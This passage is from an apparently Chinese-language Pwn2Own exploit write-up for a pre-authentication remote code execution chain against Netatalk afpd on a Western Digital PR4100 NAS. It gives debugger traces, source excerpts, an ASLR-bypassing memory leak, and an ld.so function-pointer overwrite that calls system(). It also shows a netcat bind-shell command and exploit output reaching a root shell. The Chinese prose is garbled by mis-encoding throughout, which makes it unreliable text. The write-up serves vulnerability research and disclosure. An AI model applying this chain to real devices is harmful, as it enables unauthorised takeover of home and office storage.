#0  0x00007f423de3eb50 in _dl_open (file=0x7f423dbf0e86 "libgcc_s.so.1", mode=-2147483646, caller_dlopen=0x7f423db771c5 <init+21>, nsid=-2, argc=4, argv=0x7fffa4967cf8, env=0x7fffa4967d20) at dl-open.c:548
#1  0x00007f423dba406d in do_dlopen (Reading in symbols for dl-error.c...done.
ptr=ptr@entry=0x7fffa4966170) at dl-libc.c:96
#2  0x00007f423dba4b2f in __GI__dl_catch_exception (exception=exception@entry=0x7fffa49660f0, operate=operate@entry=0x7f423dba4030 <do_dlopen>, args=args@entry=0x7fffa4966170) at dl-error-skeleton.c:196
#3  0x00007f423dba4bbf in __GI__dl_catch_error (objname=objname@entry=0x7fffa4966148, errstring=errstring@entry=0x7fffa4966150, mallocedp=mallocedp@entry=0x7fffa4966147, operate=operate@entry=0x7f423dba4030 <do_dlopen>, args=args@entry=0x7fffa4966170) at dl-error-skeleton.c:215
#4  0x00007f423dba4147 in dlerror_run (operate=operate@entry=0x7f423dba4030 <do_dlopen>, args=args@entry=0x7fffa4966170) at dl-libc.c:46
#5  0x00007f423dba41d6 in __GI___libc_dlopen_mode (name=name@entry=0x7f423dbf0e86 "libgcc_s.so.1", mode=mode@entry=-2147483646) at dl-libc.c:195
#6  0x00007f423db771c5 in init () at backtrace.c:53
Reading in symbols for pthread_once.c...done.
#7  0x00007f423dc40997 in __pthread_once_slow (once_control=0x7f423dc2ef80 <once>, init_routine=0x7f423db771b0 <init>) at pthread_once.c:116
#8  0x00007f423db77304 in __GI___backtrace (array=<optimised out>, size=<optimised out>) at backtrace.c:106
#9  0x00007f423ddcd6db in netatalk_panic () from symbols/lib64/libatalk.so.18
#10 0x00007f423ddcd902 in ?? () from symbols/lib64/libatalk.so.18
#11 0x00007f423ddcd958 in ?? () from symbols/lib64/libatalk.so.18
Reading in symbols for ../sysdeps/unix/sysv/linux/x86_64/sigaction.c...done.
#12 <signal handler called>
#13 __memmove_sse2_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:238
#14 0x00007f423dda6fd0 in ad_rebuild_adouble_header_osx () from symbols/lib64/libatalk.so.18
#15 0x00007f423ddaa985 in ?? () from symbols/lib64/libatalk.so.18
#16 0x00007f423ddaaf34 in ?? () from symbols/lib64/libatalk.so.18
#17 0x00007f423ddad7b0 in ?? () from symbols/lib64/libatalk.so.18
#18 0x00007f423ddad9e1 in ?? () from symbols/lib64/libatalk.so.18
#19 0x00007f423ddae56c in ad_open () from symbols/lib64/libatalk.so.18
#20 0x000055cd275c1ea7 in afp_openfork ()
#21 0x000055cd275a386e in afp_over_dsi ()
#22 0x000055cd275c6ba3 in ?? ()
#23 0x000055cd275c68fd in main ()
```

æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºå´©æºƒåœ¨ä¸€æ¡`call`æŒ‡ä»¤ï¼Œåœ¨è¿™æ¡è¿™ä»¤å¤„ï¼Œæˆ‘ä»¬åŒæ—¶æ§åˆ¶äº†è¢«è°ƒç”¨çš„å‡½æ•°åœ°å€ä»¥åŠç¬¬ä¸€ä¸ªå‚æ•°ã€‚

```
(remote-gdb) x /i $pc
=> 0x7f423de3eb50 <_dl_open+48>:	call   QWORD PTR [rip+0x16412]        # 0x7f423de54f68 <_rtld_global+3848>
(remote-gdb) x /gx 0x7f423de54f68
0x7f423de54f68 <_rtld_global+3848>:	0x4242424242424242
(remote-gdb) x /s $rdi
0x7f423de54968 <_rtld_global+2312>:	'A' <repeats 35 times>
```

åœ¨IDAä¸­æ£€æŸ¥`ld-2.28.so`å¯çŸ¥ï¼Œè¿™æ˜¯ç”±äº`dl_open()`å‡½æ•°è°ƒç”¨`_dl_rtld_lock_recursive`å‡½æ•°æŒ‡é’ˆå¹¶ä¼ é€’äº†ä¸€ä¸ªæŒ‡å‘`_dl_load_lock` lockçš„æŒ‡é’ˆä½œä¸ºå‚æ•°ã€‚

```c++
void *__fastcall dl_open(
        const char *file,
        int mode,
        const void *caller_dlopen,
        Lmid_t nsid,
        int argc,
        char **argv,
        char **env)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  if ( (mode & 3) == 0 )
    _dl_signal_error(0x16, file, 0LL, "invalid mode for dlopen()");
  rtld_local._dl_rtld_lock_recursive(&rtld_local._dl_load_lock);
```

å‡½æ•°æŒ‡é’ˆå’Œlockå‚æ•°éƒ½æ˜¯`rtld_local`å…¨å±€å˜é‡çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒä½äº`.data`æ®µå½“ä¸­ã€‚

```
.data:0000000000028060 ; rtld_global rtld_local
.data:0000000000028060 _rtld_local     dq 0  
```

å› æ­¤ï¼Œå½“æˆ‘ä»¬å¯ä»¥è¦†ç›–`ld.so`çš„`.data`æ®µæ—¶ï¼Œè°ƒç”¨ä»»æ„çš„åªæœ‰ä¸€ä¸ªå‚æ•°çš„å‡½æ•°æ¥åˆ©ç”¨æ¼æ´æ˜¯ä¸€ä¸ªéå¸¸é€šç”¨çš„åŠæ³•ã€‚

æ³¨æ„ï¼šè¿™é‡Œè¿˜æœ‰å¦ä¸€ç§ç±»ä¼¼çš„[æŠ€æœ¯](https://dangokyo.me/2018/01/20/extra-exploitation-technique-1-_dl_open/)ï¼ˆå°½ç®¡æœ‰ä¸€ç‚¹ä¸åŒï¼‰

æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ï¼šé€šè¿‡å°†lockå‚æ•°è¦†ç›–ä¸ºä¸€æ¡shellå‘½ä»¤å¹¶å°†å‡½æ•°æŒ‡é’ˆè¦†ç›–ä¸º`system()`å‡½æ•°çš„åœ°å€æ¥å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚

å¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬çŸ¥é“äº†æˆ‘ä»¬å·²ç»æ§åˆ¶äº†ä¼ é€’ç»™`system()`å‡½æ•°çš„æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬ä¸éœ€è¦å»çŸ¥é“å®ƒåœ¨å†…å­˜ä¸­çš„ä½ç½®ã€‚ç„¶è€Œï¼Œç”±äºASLRå¼€å¯ï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“`system()`å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦ä¿¡æ¯æ³„éœ²çš„åˆ©ç”¨åŸè¯­æ¥ç»•è¿‡ASLRã€‚

## æ„å»ºä¸€ä¸ªä¿¡æ¯æ³„éœ²åˆ©ç”¨
å¦‚æœæˆ‘ä»¬æ£€æŸ¥å…ˆå‰çš„backtraceï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºå®é™…ä¸Šå´©æºƒåœ¨äº†`ad_rebuild_adouble_header_osx()`å‡½æ•°ã€‚æ›´å‡†ç¡®åœ°è¯´ï¼Œæˆ‘ä»¬å‘ç°äº†åœ¨`ad_convert_osx()`å‡½æ•°ä¸­å‘ç”Ÿäº†ä»¥ä¸‹å‡ ä»¶äº‹ï¼š

* åŸå§‹çš„AppleDoubleæ–‡ä»¶é€šè¿‡`mmap()`å‡½æ•°è¢«æ˜ å°„è¿›å†…å­˜
* å…ˆå‰è®¨è®ºçš„`memmove()`è¢«è°ƒç”¨ï¼Œç”¨æ¥ä¸¢å¼ƒFinderInfoéƒ¨åˆ†çš„å†…å®¹
* `ad_rebuild_adouble_header_osx()`å‡½æ•°è¢«è°ƒç”¨
* è¢«æ˜ å°„çš„æ–‡ä»¶é€šè¿‡`munmap()`å‡½æ•°è¢«å–æ¶ˆæ˜ å°„

```c++
//netatalk-3.1.12/libatalk/adouble/ad_open.c
/**
 * Convert from Apple's ._ file to Netatalk
 *
 * Apple's AppleDouble may contain a FinderInfo entry longer then 32 bytes
 * containing packed xattrs. Netatalk can't deal with that, so we
 * simply discard the packed xattrs.
 *
 * As we call ad_open() which might result in a recursion, just to be sure
 * use static variable in_conversion to check for that.
 *
 * Returns -1 in case an error occured, 0 if no conversion was done, 1 otherwise
 **/
static int ad_convert_osx(const char *path, struct adouble *ad)
{
    EC_INIT;
    static bool in_conversion = false;
    char *map;
    int finderlen = ad_getentrylen(ad, ADEID_FINDERI);
    ssize_t origlen;

    if (in_conversion || finderlen == ADEDLEN_FINDERI)
        return 0;
    in_conversion = true;

    LOG(log_debug, logtype_ad, "Converting OS X AppleDouble %s, FinderInfo length: %d",
        fullpathname(path), finderlen);

    origlen = ad_getentryoff(ad, ADEID_RFORK) + ad_getentrylen(ad, ADEID_RFORK);

    map = mmap(NULL, origlen, PROT_READ | PROT_WRITE, MAP_SHARED, ad_reso_fileno(ad), 0);
    if (map == MAP_FAILED) {
        LOG(log_error, logtype_ad, "mmap AppleDouble: %s\n", strerror(errno));
        EC_FAIL;
    }

    memmove(map + ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI,
            map + ad_getentryoff(ad, ADEID_RFORK),
            ad_getentrylen(ad, ADEID_RFORK));

    ad_setentrylen(ad, ADEID_FINDERI, ADEDLEN_FINDERI);
    ad->ad_rlen = ad_getentrylen(ad, ADEID_RFORK);
    ad_setentryoff(ad, ADEID_RFORK, ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI);

    EC_ZERO_LOG( ftruncate(ad_reso_fileno(ad),
                           ad_getentryoff(ad, ADEID_RFORK)
                           + ad_getentrylen(ad, ADEID_RFORK)) );

    (void)ad_rebuild_adouble_header_osx(ad, map);
    munmap(map, origlen);
```

`ad_rebuild_adouble_header_osx()`å‡½æ•°å¦‚ä¸‹æ‰€ç¤ºã€‚è¯¥å‡½æ•°è´Ÿè´£å°†`adouble`ç»“æ„ä½“ä¸­çš„å†…å®¹ä»¥AppleDoubleæ ¼å¼å†™å›è¢«æ˜ å°„çš„æ–‡ä»¶åŒºåŸŸï¼Œå› æ­¤å†™å›çš„å†…å®¹å°†ä¿å­˜åœ¨ç£ç›˜ä¸Šçš„æ–‡ä»¶ä¸­ã€‚

```c++
//netatalk-3.1.12/libatalk/adouble/ad_flush.c
/*!
 * Prepare adbuf buffer from struct adouble for writing on disk
 */
int ad_rebuild_adouble_header_osx(struct adouble *ad, char *adbuf)
{
    uint32_t       temp;
    uint16_t       nent;
    char           *buf;

    LOG(log_debug, logtype_ad, "ad_rebuild_adouble_header_osx");

    buf = &adbuf[0];

    temp = htonl( ad->ad_magic );
    memcpy(buf, &temp, sizeof( temp ));
    buf += sizeof( temp );

    temp = htonl( ad->ad_version );
    memcpy(buf, &temp, sizeof( temp ));
    buf += sizeof( temp );

    memcpy(buf, AD_FILLER_NETATALK, strlen(AD_FILLER_NETATALK));
    buf += sizeof( ad->ad_filler );

    nent = htons(ADEID_NUM_OSX);
    memcpy(buf, &nent, sizeof( nent ));
    buf += sizeof( nent );

    /* FinderInfo */
    temp = htonl(EID_DISK(ADEID_FINDERI));
    memcpy(buf, &temp, sizeof( temp ));
    buf += sizeof( temp );

    temp = htonl(ADEDOFF_FINDERI_OSX);
    memcpy(buf, &temp, sizeof( temp ));
    buf += sizeof( temp );

    temp = htonl(ADEDLEN_FINDERI);
    memcpy(buf, &temp, sizeof( temp ));
    buf += sizeof( temp );

    memcpy(adbuf + ADEDOFF_FINDERI_OSX, ad_entry(ad, ADEID_FINDERI), ADEDLEN_FINDERI);

    /* rfork */
    temp = htonl( EID_DISK(ADEID_RFORK) );
    memcpy(buf, &temp, sizeof( temp ));
    buf += sizeof( temp );

    temp = htonl(ADEDOFF_RFORK_OSX);
    memcpy(buf, &temp, sizeof( temp ));
    buf += sizeof( temp );

    temp = htonl( ad->ad_rlen);
    memcpy(buf, &temp, sizeof( temp ));
    buf += sizeof( temp );

    return AD_DATASZ_OSX;
}
```

ä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨è°ƒè¯•å™¨ä¸­çœ‹ä¸€ä¸‹`memcpy()`å‡½æ•°çš„å‚æ•°ï¼Œå¯ä»¥æ³¨æ„åˆ°åŸåœ°å€æ¥è‡ªäºæ ˆä¸Šï¼Œå¹¶ä¸”å·²ç»è¶Šç•Œäº†ï¼š

```
memcpy(0x7f423de20032, 0x7fffa499bbba, 32)
```

```
(gdb) info proc mappings 
...
          Start Addr           End Addr       Size     Offset objfile
      0x7fffa4923000     0x7fffa4969000    0x46000        0x0 [stack]
      0x7fffa49f9000     0x7fffa49fc000     0x3000        0x0 [vvar]
      0x7fffa49fc000     0x7fffa49fe000     0x2000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

å¦‚æœä½ çœ‹ä¸€ä¸‹ä¹‹å‰æåˆ°çš„`ad_header_read_osx()`å‡½æ•°çš„ä»£ç ï¼Œä½ ä¼šæ³¨æ„åˆ°è¿™æ˜¯è‚¯å®šçš„ï¼Œå› ä¸ºæ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡`struct adouble adosx;`ï¼ˆå› æ­¤å­˜å‚¨äºæ ˆä¸Šï¼‰ä¿å­˜äº†AppleDoubleç»“æ„ä½“ï¼Œå¹¶ä¸€ç›´ä¼ é€’åˆ°äº†`ad_rebuild_adouble_header_osx()`å‡½æ•°ã€‚

æ‰€ä»¥è¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿå¥½å§ï¼Œ`memcpy()`å‡½æ•°ä»ä¸€ä¸ªåŸºäºæ ˆçš„åç§»åœ°å€å†™å…¥32å­—èŠ‚è‡³æ–‡ä»¶åœ¨å†…å­˜ä¸­æ˜ å°„çš„åŒºåŸŸã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è®©ç¨‹åºå°†ä»»æ„çš„å†…å­˜å†…å®¹å†™å›ç£ç›˜ä¸Šçš„æ–‡ä»¶ä¸­ã€‚ä¹‹åæˆ‘ä»¬å¯ä»¥é€šè¿‡SMBè¯»å–forkæ–‡ä»¶çš„å†…å®¹ï¼ˆä»¥AppleDoubleæ ¼å¼å­˜å‚¨ï¼‰å¹¶ä¸”å¯ä»¥å°†è¿™éƒ¨åˆ†æ³„éœ²çš„å†…å®¹è¯»å‡ºæ¥ã€‚

è¿™éå¸¸å¥½ï¼Œä½†æ˜¯ç¨‹åºçš„æ ˆä¸Šæ˜¯å¦æœ‰`libc.so`åº“çš„åœ°å€æ³„éœ²å‡ºæ¥å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬æƒ³è¦è°ƒç”¨`libc.so`åº“ä¸­çš„`system()`å‡½æ•°ã€‚

äº‹å®è¯æ˜è¿™ç§åœ°å€æ˜¯æœ‰çš„ï¼Œå› ä¸º`main()`å‡½æ•°æ˜¯ä»`__libc_start_main()`å‡½æ•°ä¸­è¢«è°ƒç”¨çš„ï¼š

```
.text:0000000000023FB0 __libc_start_main proc near 
...
.text:0000000000024099                 call    rax             ; main()
.text:000000000002409B
.text:000000000002409B loc_2409B:                              ; CODE XREF: __libc_start_main+15Aâ†“j
.text:000000000002409B                 mov     edi, eax
.text:000000000002409D                 call    __GI_exit
```

# åˆå¹¶åˆ©ç”¨
åœ¨è¥¿éƒ¨æ•°æ®PR4100è®¾å¤‡çš„é»˜è®¤é…ç½®ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡AFPå’ŒSMBåè®®æ¥åœ¨è®¤è¯ä¹‹å‰è¯»å†™`Public`å…±äº«ç›®å½•ä¸­çš„ä»»æ„æ–‡ä»¶ã€‚

æˆ‘ä»¬è¿˜çŸ¥é“ï¼Œä¸€ä¸ª`afpd`å­è¿›ç¨‹æ˜¯ä»`afpd`çˆ¶è¿›ç¨‹forkè€Œæ¥ï¼Œç”¨æ¥å¤„ç†æ¯ä¸ªå®¢æˆ·ç«¯è¿æ¥çš„ã€‚è¿™æ„å‘³ç€æ¯ä¸ªå­è¿›ç¨‹å¯¹æ‰€æœ‰å·²ç»åŠ è½½çš„åº“éƒ½æœ‰ç›¸åŒçš„éšæœºæ€§ã€‚

ä¸ºäº†è§¦å‘è¯¥æ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª`mooncake`å¸¸è§„æ–‡ä»¶å­˜åœ¨äºå…±äº«ç›®å½•ä¸­ï¼Œä»¥åŠä¸€ä¸ªç²¾å¿ƒæ„é€ çš„`._mooncake` forkæ–‡ä»¶å­˜åœ¨äºç›¸åŒçš„ç›®å½•ä¸­ã€‚ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡AFPè°ƒç”¨â€œFPOpenForkâ€å‘½ä»¤è®¿é—®`mooncake`æ–‡ä»¶ï¼Œè¯¥å‘½ä»¤ä¼šè§£æ`._mooncake` forkæ–‡ä»¶ï¼ˆä»¥AppleDoubleæ–‡ä»¶æ ¼å¼ä¿å­˜ï¼‰ã€‚æœ€ç»ˆå®ƒä¼šè°ƒç”¨`ad_convert_osx()`å‡½æ•°ï¼Œè¯¥å‡½æ•°è´Ÿè´£å°†è‹¹æœçš„AppleDoubleæ–‡ä»¶è½¬æ¢ä¸ºä¸€ä¸ªæ›´ç®€å•çš„æ ¼å¼ç‰ˆæœ¬ã€‚

å› æ­¤ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ›å»º`mooncake`æ–‡ä»¶ã€‚æˆ‘ä»¬é€šè¿‡AFPæ¥å£åˆ›å»ºï¼Œä½†æ˜¯æˆ‘ä»¬è®¤ä¸ºä¹Ÿå¯ä»¥é€šè¿‡SMBæ¥åˆ›å»ºã€‚ä¹‹åæˆ‘ä»¬æƒ³è§¦å‘ä¸¤æ¬¡æ¼æ´ã€‚

ç¬¬ä¸€æ¬¡ï¼Œæˆ‘ä»¬æ„é€ `._mooncake` forkæ–‡ä»¶æ¥æ»¥ç”¨`ad_rebuild_adouble_header_osx()`ä¸­çš„`memcpy()`å‡½æ•°ã€‚å½“è§¦å‘æ¼æ´æ—¶ï¼š

* åŸå§‹çš„`._mooncake` forkæ–‡ä»¶é€šè¿‡`mmap()`å‡½æ•°è¢«æ˜ å°„è¿›å†…å­˜
* `memcpy()`å‡½æ•°å°†`__libc_start_main()`å‡½æ•°çš„è¿”å›åœ°å€å†™å…¥è¢«æ˜ å°„çš„åŒºåŸŸ
* `munmap()`å‡½æ•°è¢«è°ƒç”¨ï¼Œä¸Šè¿°åœ°å€è¢«ä¿å­˜è¿›ç£ç›˜ä¸Šçš„`._mooncake` forkæ–‡ä»¶
* æˆ‘ä»¬å¯ä»¥é€šè¿‡SMBåè®®è¯»å–`._mooncake` forkæ–‡ä»¶æ¥è·å–æ³„æ¼å‡ºçš„åœ°å€ï¼ˆå°±åƒè¯»å–å¸¸è§„æ–‡ä»¶ä¸€æ ·ï¼‰

è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ¨æ–­å‡º`libc.so`çš„åŸºåœ°å€ï¼Œå¹¶ä¸”è®¡ç®—å‡º`system()`å‡½æ•°çš„åœ°å€ã€‚

ç¬¬äºŒæ¬¡ï¼Œæˆ‘ä»¬ç²¾å¿ƒæ„é€ `._mooncake` forkæ–‡ä»¶ï¼Œæ»¥ç”¨`ad_convert_osx()`å‡½æ•°ä¸­çš„`memmove()`å‡½æ•°ã€‚å½“è§¦å‘æ¼æ´æ—¶ï¼š

* `._mooncake`åŸå§‹forkæ–‡ä»¶é€šè¿‡`mmap()`å‡½æ•°è¢«æ˜ å°„è¿›å†…å­˜
* `memmove()`å‡½æ•°è¦†ç›–äº†`ld.so`çš„`.data`æ®µï¼Œç ´å`rtld_local._dl_rtld_lock_recursive`å‡½æ•°æŒ‡é’ˆï¼Œå°†å…¶ç¯¡æ”¹ä¸º`system()`å‡½æ•°çš„åœ°å€ï¼Œç ´å`rtld_local._dl_load_lock`çš„æ•°æ®ï¼Œç¯¡æ”¹ä¸ºè¦æ‰§è¡Œçš„shellå‘½ä»¤
* ç”±äºè®¿é—®äº†éæ³•çš„æœªæ˜ å°„çš„æ ˆåœ°å€ï¼Œ`memcpy()`å‡½æ•°å´©æºƒ
* Netatalkçš„å¼‚å¸¸å¤„ç†å‡½æ•°è°ƒç”¨å¹¶è¿›å…¥`dl_open()`å‡½æ•°ï¼Œç”±äºä¸Šä¸€æ­¥å·²ç»ç¯¡æ”¹äº†ç›¸å…³å†…å®¹ï¼Œå› æ­¤ä¼šè°ƒç”¨`system()`å‡½æ•°ï¼Œå¹¶æ‰§è¡Œæˆ‘ä»¬æŒ‡å®šçš„ä»»æ„shellå‘½ä»¤

æˆ‘ä»¬é¢„å…ˆé€šè¿‡SMBåè®®åœ¨å…±äº«ç›®å½•ä¸­æ”¾ç½®äº†ä¸€ä¸ªé™æ€å˜å¼‚çš„`netcat`ç¨‹åºï¼Œå¹¶é€šè¿‡ä»¥ä¸‹è·¯å¾„æ‰§è¡Œï¼š`/mnt/HD/HD_a2/Public/tools/netcat -nvlp 9999 -e /bin/sh`ã€‚

ä¸‹é¢æ˜¯æ¼æ´åˆ©ç”¨æ—¶çš„è¿‡ç¨‹ï¼š

```
# ./mooncake.py -i 192.168.1.3
(12:26:23) [*] Triggering leak...
(12:26:27) [*] Connected to AFP server
(12:26:27) [*] Leaked libc return address: 0x7f45e23f809b
(12:26:27) [*] libc base: 0x7f45e23d4000
(12:26:27) [*] Triggering system() call...
(12:26:27) [*] Using system address: 0x7f45e24189c0
(12:26:27) [*] Connected to AFP server
(12:26:29) [*] Connection timeout detected :)
(12:26:30) [*] Spawning a shell. Type any command.
uname -a
Linux MyCloudPR4100 4.14.22 #1 SMP Mon Dec 21 02:16:13 UTC 2020 Build-32 x86_64 GNU/Linux
id
uid=0(root) gid=0(root) euid=501(nobody) egid=1000(share) groups=1000(share)
pwd
/mnt/HD/HD_a2/Public/edg
```

## Pwn2Own ç¬”è®°
å½“æ¯”èµ›æ—¶åˆ©ç”¨è¯¥æ¼æ´æ—¶ï¼Œç¬¬ä¸€æ¬¡å°è¯•å¤±è´¥åœ¨äº†åœ°å€æ³„éœ²é˜¶æ®µã€‚æˆ‘ä»¬çŒœæµ‹ç›¸æ¯”äºæˆ‘ä»¬è‡ªå·±çš„æµ‹è¯•ç¯å¢ƒï¼Œå¯èƒ½æ˜¯ç”±äºç›®æ ‡ç¯å¢ƒçš„æ—¶æœºé—®é¢˜æ‰€å¯¼è‡´çš„ã€‚å› æ­¤æˆ‘ä»¬ä¿®æ”¹äº†ä»£ç ï¼Œåœ¨æ³„éœ²åœ°å€ä¹‹å‰å¼•å…¥ä¸€ä¸ª`sleep()`ï¼Œä»¥ç¡®ä¿sambaæœ‰æ—¶é—´è¿”å›æˆ‘ä»¬é€šè¿‡æ¼æ´ä¿®æ”¹çš„æ•°æ®ã€‚æˆ‘ä»¬çš„ç¬¬äºŒæ¬¡å°è¯•è·å–äº†æ³„éœ²åœ°å€ï¼Œä½†æ˜¯å°è¯•é€šè¿‡telnetè¿æ¥ç›®æ ‡æ—¶å†æ¬¡å¤±è´¥äº†ï¼Œå› æ­¤æˆ‘ä»¬åœ¨è¿æ¥telnetä¹‹å‰åˆé¢å¤–æ·»åŠ äº†ä¸€ä¸ª`sleep()`ï¼Œä»¥ç¡®ä¿`system()`å‘½ä»¤è¢«æ­£ç¡®çš„æ‰§è¡Œã€‚å¹¸è¿çš„æ˜¯è¿™å¾ˆæœ‰æ•ˆï¼Œè¿™è¯´æ˜å•å•æ·»åŠ é¢å¤–çš„ä¼‘çœ æ—¶é—´è¶³ä»¥ä¿®å¤ä¸å¯é çš„æ¼æ´åˆ©ç”¨ï¼Œæˆ‘ä»¬åœ¨æˆ‘ä»¬æœ€åçš„ç¬¬ä¸‰æ¬¡å°è¯•æˆåŠŸäº†ğŸ™‚ã€‚